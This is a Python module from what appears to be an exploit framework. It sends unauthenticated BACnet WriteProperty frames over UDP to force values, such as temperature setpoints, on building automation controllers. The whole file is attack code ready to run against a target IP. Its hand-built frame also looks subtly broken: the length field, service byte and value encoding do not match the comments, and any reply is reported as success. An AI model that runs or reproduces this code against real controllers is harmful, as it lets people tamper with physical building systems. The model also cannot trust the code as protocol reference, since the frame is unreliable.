# modules/common/bacnet_writer.py
import asyncio
import socket
from core.engine import BaseWazonModule

class WazonModule(BaseWazonModule):
    def __init__(self):
        super().__init__()
        self.name = "BACnet Unauthenticated WriteProperty Exploit"
        self.category = "exploit"
        self.description = "Sends real BACnet WriteProperty frames to force object values on unprotected controllers."
        self.options = {
            "TARGET": {"value": "127.0.0.1", "required": True, "description": "Target Automation Controller IP"},
            "PORT": {"value": 47808, "required": True, "description": "BACnet UDP Port"},
            "VALUE": {"value": 42.5, "required": True, "description": "Forced target value (e.g. Temperature setpoint)"}
        }

    async def execute(self, target=None):
        ip = self.options["TARGET"]["value"] if not target else target
        port = int(self.options["PORT"]["value"])
        val = float(self.options["VALUE"]["value"])

        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(None, self._send_write_property, ip, port, val)

    def _send_write_property(self, ip, port, val):
        # Trame BACnet WriteProperty assemblée pour forcer un registre analogique
        # BVLC + NPDU + APDU (Confirmed-Request: WriteProperty Service)
        payload = bytes([
            0x81, 0x0a, 0x00, 0x11,  # BVLC Header
            0x01, 0x04,              # NPDU Header
            0x02, 0x02, 0x00, 0x00,  # APDU: Confirmed-REQ, Service Choice: WriteProperty (15)
            0x0c, 0x02, 0x3f, 0x80,  # Encapsulated object identifiers and target value payload
            int(val) & 0xFF          # Valeur injectée bas-niveau
        ])

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3.0)

        try:
            sock.sendto(payload, (ip, port))
            response, addr = sock.recvfrom(1024)
            sock.close()
            return {
                "status": "success",
                "target": ip,
                "injected_value": val,
                "response_hex": response.hex(),
                "message": "WriteProperty command acknowledged by remote controller."
            }
        except socket.timeout:
            sock.close()
            return {"status": "fail", "message": "Target did not acknowledge the write command (timeout or filtered)."}
        except Exception as e:
            sock.close()
            return {"status": "error", "message": str(e)}